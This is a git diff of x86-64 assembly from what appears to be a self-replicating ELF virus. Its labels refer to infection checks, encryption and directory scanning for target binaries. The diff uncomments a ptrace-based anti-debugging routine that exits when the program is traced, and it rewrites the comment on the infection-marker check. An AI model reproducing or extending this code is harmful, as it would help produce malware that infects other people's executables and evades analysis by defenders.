@@ -114,19 +114,19 @@ _start:
 	sub  rsp, WAR_STACK_SIZE                    ; Reserve some space in the register r15 to store all the data needed by the program
 	mov r15, rsp
 
-; _ptrace_anti_debug:
-; 	mov rdi, PTRACE_TRACEME
-; 	mov rsi, SELF_PID
-; 	lea rdx, 1
-; 	mov r10, 0
-; 	mov rax, SYS_PTRACE
-; 	syscall
+_ptrace_anti_debug:
+	mov rdi, PTRACE_TRACEME
+	mov rsi, SELF_PID
+	lea rdx, 1
+	mov r10, 0
+	mov rax, SYS_PTRACE
+	syscall
 
-; 	cmp rax, 0
-; 	jl _end
+	cmp rax, 0
+	jl _end
 
-; 	mov rax, SYS_GETGID
-; 	syscall
+	mov rax, SYS_GETGID
+	syscall
 
 _is_encrypted:
 	lea rdi, [r9]
@@ -525,7 +525,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		imul rax, rax, 1
 
 	_is_infected:
-		cmp dword [r15 + 1308], 0x00000049         ; check if bichooo!! ssuuuuu
+		cmp dword [r15 + 1308], 0x00000049         ; check if infected
 		je _close_bin
 
 	_save_entry_dpuente:
